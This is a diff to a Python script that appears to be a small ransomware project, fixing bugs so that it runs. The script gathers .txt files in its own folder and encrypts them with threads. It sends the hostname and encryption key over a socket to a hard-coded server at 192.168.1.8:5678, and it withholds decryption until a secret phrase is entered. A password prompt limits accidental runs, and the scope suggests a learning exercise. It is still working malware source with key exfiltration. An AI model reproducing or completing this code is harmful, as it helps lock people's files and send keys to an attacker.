@@ -1,5 +1,4 @@
 import os
-import sys
 import socket
 import threading
 import queue
@@ -11,49 +10,41 @@ from decrypt import decrypt
 # List of file paths in path
 def file_paths(path):
 
-    file_paths = []
+    files = []
     code_files = ["maze.py", "decrypt.py", "encrypt.py", "README.md", ".gitignore"]
     for file in os.listdir(path):
 
         # Ignore code files
-        if file in code_files or file == sys.argv[0]:  #sys.argv[0] == 'script.py'
+        if file in code_files:  #sys.argv[0] == 'script.py'
             continue
 
         file_path = os.path.join(path, file)
 
         # Only considering text files
         if os.path.isfile(file_path) and file.endswith(".txt"):
-            file_paths.append(file_path)
+            files.append(file_path)
 
-    return file_paths
+    return files
 
 
 # Encrypt files
 def encrypt_files(key, path):
     
     encrypted_files = 0
-    file_paths = file_paths(path)
+    file_path = file_paths(path)
 
     q = queue.Queue()
 
     # enter files in queue
-    for file in file_paths:
+    for file in file_path:
         q.put(file)
         encrypted_files += 1
-    
-    # use thread to encrypt
-    for i in range(30):
-        thread = threading.Thread(target=func, daemon=True)
-        thread.start()
 
-    q.join()  # checks for if threads completed the task (q.task_done())
 
-    def func(key):
+    def func():
         while q.not_empty:
-
             try:
                 file = q.get()
-
                 # Load the content of file
                 with open(file, 'r') as f:
                     content = f.read()
@@ -68,6 +59,13 @@ def encrypt_files(key, path):
                 print(f'Failed to encrypt file {file}')
 
             q.task_done()
+    
+    # use thread to encrypt
+    for i in range(2):
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+
+    q.join()  # checks for if threads completed the task (q.task_done())
 
     return encrypted_files
 
@@ -76,25 +74,18 @@ def encrypt_files(key, path):
 def decrypt_files(key, path):
     
     decrypted_files = 0
-    file_paths = file_paths(path)
+    file_path = file_paths(path)
 
     q = queue.Queue()
 
     # enter files in queue
-    for file in file_paths:
+    for file in file_path:
         q.put(file)
         decrypted_files += 1
 
-    # use thread to decrypt
-    for i in range(30):
-        thread = threading.Thread(target=func, daemon=True)
-        thread.start()
 
-    q.join() 
-
-    def func(key):
+    def func():
         while q.not_empty:
-
             file = q.get()
 
             # Load the content of file
@@ -110,6 +101,13 @@ def decrypt_files(key, path):
             
             q.task_done()
 
+    # use thread to decrypt
+    for i in range(2):
+        thread = threading.Thread(target=func, daemon=True)
+        thread.start()
+
+    q.join() 
+
     return decrypted_files
 
 
@@ -120,7 +118,7 @@ def generate_key():
 
     # employing char pool (every combination possible in 8bit)
     char_pool = ''
-    for ch in range(0x00, 0xFF):
+    for ch in range(1, 126):
         char_pool += chr(ch)
 
 
@@ -137,7 +135,7 @@ if __name__ == '__main__':
 
 
     # Safeguard against running into your own computer
-    safeguard = input('Enter the password to run')
+    safeguard = input('Enter the password to run: ')
     if(safeguard != 'initiate'):
         quit()
 
@@ -149,18 +147,21 @@ if __name__ == '__main__':
     hostname = os.getenv('COMPUTERNAME')
 
     # host ip address and port
-    IP_ADDRESS = '192.168.1.4' 
-    PORT = 5678
+    SERVER_IP = '192.168.1.8' 
+    SERVER_PORT = 5678
 
     # establishing connection
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((IP_ADDRESS, PORT))
-        s.send(f'{IP_ADDRESS}: {hostname}:{key} ')
+        s.connect((SERVER_IP, SERVER_PORT))
+        s.send(f'{SERVER_IP} : {hostname} : {key} '.encode('utf-8'))
+        # data = s.recv(1024)
+        # while data == "":
+        #     print(data)
 
 
     # Encrypt file (same folder)
     path = os.path.dirname(os.path.abspath(__file__))
-    count = encrypt_files(path)
+    count = encrypt_files(key, path)
     print(f'Number of encrypted files: {count}')
 
 
@@ -171,4 +172,4 @@ if __name__ == '__main__':
     if(user_phrase == secret_phrase):
         decrypt_files(key, path)
     else:    
-        print("Sorry, wrong phrase!")    
+        print("Sorry, wrong phrase!")
